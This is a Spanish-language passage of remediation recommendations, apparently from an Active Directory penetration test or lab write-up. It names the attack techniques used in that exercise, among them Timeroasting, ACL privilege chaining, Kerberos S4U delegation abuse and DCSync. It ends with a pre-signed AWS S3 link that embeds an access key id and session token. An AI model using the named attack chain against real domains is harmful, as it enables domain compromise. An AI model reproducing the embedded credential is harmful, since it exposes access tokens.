4. **El servicio NTP debe protegerse frente a Timeroasting**  
   La exposición de respuestas NTP permitió obtener material crackeable asociado a cuentas de equipo. Deben aplicarse las actualizaciones y controles recomendados para reducir esta exposición.

5. **Las ACL de Active Directory deben revisarse según rutas de ataque completas**  
   La combinación de `WriteOwner`, `GenericAll`, `ForceChangePassword` y `WriteDACL` permitió encadenar privilegios hasta comprometer cuentas críticas.

6. **La delegación Kerberos debe limitarse estrictamente**  
   La delegación restringida con transición de protocolo permitió suplantar al Administrador. Debe configurarse solo para cuentas y servicios imprescindibles, evitando privilegios excesivos.

7. **Las credenciales no deben almacenarse en archivos de configuración**  
   `my.ini` contenía la contraseña de MariaDB en texto plano. Deben utilizarse secretos protegidos, permisos restrictivos y cuentas de servicio con privilegios mínimos.

8. **No deben utilizarse MD5 para almacenar contraseñas**  
   Los hashes MD5 de la base de datos fueron crackeados con facilidad. Deben emplearse algoritmos adaptativos como Argon2id, bcrypt o scrypt, con sal única por contraseña.

9. **Los permisos de movimiento entre OUs deben controlarse**  
   La combinación de `DELETE_CHILD` y `CREATE_CHILD` permitió mover un usuario a una OU con permisos más amplios. Las ACL y delegaciones sobre OUs deben revisarse conjuntamente.

10. **Las herramientas internas deben proteger las credenciales durante conexiones SSH**  
    La herramienta de mantenimiento permitió capturar credenciales de una cuenta de máquina. Deben utilizarse autenticación mediante claves, verificación estricta de host y prohibirse contraseñas reutilizables o transmitidas de forma insegura.

11. **Las cuentas de máquina no deben utilizarse como identidades de delegación sin controles estrictos**  
    La modificación de `msDS-AllowedToDelegateTo` y `TRUSTED_TO_AUTH_FOR_DELEGATION` permitió realizar S4U y DCSync. Estos atributos deben monitorizarse y limitarse mediante mínimo privilegio. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/159474343/2497e59f-6541-4877-99e2-4f7eb42e93bb/paste.txt?AWSAccessKeyId=ASIA2F3EMEYE3Z7AGY4X&Signature=jcdSuhnIeS7qilly13BVneYjaNk%3D&x-amz-security-token=IQoJb3JpZ2luX2VjEOr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJGMEQCIHYjegGY556a995wfbGobBTm%2F3hhsun3IMJQ2SMxE%2BpZAiA%2BckI0Sytr3zZO%2B6PXFXHe96UFs8mNBwlzqDS1zNOoliqDBQiy%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAEaDDY5OTc1MzMwOTcwNSIM3OKWe9sggTa78OW5KtcEe6i1S7oKfPZ7uc18Y1IdOuhGplXhOGXmnJIWTqvNMVcF068HsYOczydVQMYMxFjLQ7WthGwDgfZSJSBfnoi1GE9UjWcpLL6OpvhtGC9egBIIgYqm6yrmyH7u2oVZhNmja%2FrXR%2FwcLJXPtIoA8%2FuXy3CMmu3fx3INm%2F27o1zEp5YH5vS1zCAn3q%2BoUBJUnG%2FdNyqNMGUbaByURWG0eX%2BjJaLobX%2Fz9a4Mq5oaybsZjaEsc%2FU3pD3nvEP12uvZR1oyF7sqKNXpHgOFemqcJZNH6Z6Ey7Na8RnqZ7oe%2FBIIV5u1YqC0Wb1BO4HWzrVN0p52IaiGBGk9PoPQz8Y4xhPoBzE2BmqXj4zW0thMh2XnxFWe3AjSk5zJ1cu5X9%2BzM%2FJyvHSNZRUopXFdnsaBY7TEAym%2BA289Uft4AuqM3NeYD6%2FXbMPrEazuZXt%2BcmwKNUTOc143Gja55GwmbOh%2BDTgCT0I%2FssPQHZdX0LMFkYghDdFm6c1ydIfipGD7wIHnxEWVoI6z2XaGL%2Ftl0pgYiuEg8eJsQiTJKTuZ4XEBEetfa4RiRtzpXkykeERkuig77MLxSUHhQyzJIViN2l%2FlRbCDV8wgYDGrVf8%2Bz0Xo8bP1OVpx7wYkPHmo0mYdtx1kIaQM02QRIug201%2B832LWh6ljz73a2Hs4AosqJpEihDrKvGXdOX8TlwnNAhblCdhXD5o552VE196s90bzA2yg2VQvLS1a9sLYI%2Bmq18nbTzDpdag9eR5K61prVHAZW9giTw9IfVF%2BBiwgmDxJVUYJr6TvTtQ%2BNrEXjgAwmviE1gY6mQHyBIDTnPv%2BBwXxwVKrvXK6ccthyoZ7QhM4GciwFuwxrf4WZfEJKleN32X%2F8t4vZEdctXKtmZgv3tL38VadedgN4hcmqv3jy6Jh%2FjXnMXMXB8GaEc6%2BMISyvK6Q2XuZGCv1gE95%2FDmTbTZUVJAbVhYnE88G6f0zIgdnEl8ZB%2BrwXQ1Lph55a2fy7Ux7iWwEQe%2FTNeAgeG781%2Fk%3D&Expires=1791052269)
